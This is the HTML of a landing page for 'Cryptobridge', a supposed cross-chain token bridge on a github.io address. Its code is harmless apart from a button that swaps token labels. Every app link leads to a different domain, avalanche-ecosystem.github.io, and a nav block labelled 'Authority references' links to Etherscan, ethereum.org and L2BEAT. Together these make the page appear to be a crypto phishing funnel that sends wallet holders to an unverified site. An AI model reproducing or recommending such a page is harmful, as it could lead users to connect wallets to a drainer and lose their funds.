<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cryptobridge</title>
  <meta name="description" content="Cryptobridge moves tokens between blockchains from your own wallet.">
  <link rel="canonical" href="https://cryptobridge-com.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F6F2">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Cryptobridge">
  <meta property="og:description" content="Cryptobridge moves tokens between blockchains from your own wallet.">
  <meta property="og:url" content="https://cryptobridge-com.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Cryptobridge">
  <meta name="twitter:description" content="Cryptobridge moves tokens between blockchains from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://cryptobridge-com.github.io/#website",
        "url": "https://cryptobridge-com.github.io/",
        "name": "Cryptobridge",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://cryptobridge-com.github.io/#organization",
        "name": "Cryptobridge",
        "url": "https://cryptobridge-com.github.io/"
      },
      {
        "@type": "WebApplication",
        "@id": "https://cryptobridge-com.github.io/#application",
        "name": "Cryptobridge",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://cryptobridge-com.github.io/"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Cryptobridge home">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>Cryptobridge</span>
    </a>
    <nav class="nav" aria-label="Authority references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
      <a href="https://l2beat.com/scaling/summary" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="Cryptobridge">
      <h1>Cryptobridge</h1>
      <p class="sub"><strong>Cryptobridge</strong> moves tokens between blockchains from your own wallet.</p>
    </section>

    <section class="app-card" aria-label="Cross-chain bridge route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img class="token" src="eth.png" width="30" height="30" alt="ETH">
            <span class="asset">ETH</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch route direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img class="token" src="usdc.png" width="30" height="30" alt="USDC">
            <span class="asset">USDC</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="footer">Cryptobridge &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";

    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;

      var from = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = from;
      button.classList.toggle("is-swapped");
    });
  })();
  </script>
</body>
</html>
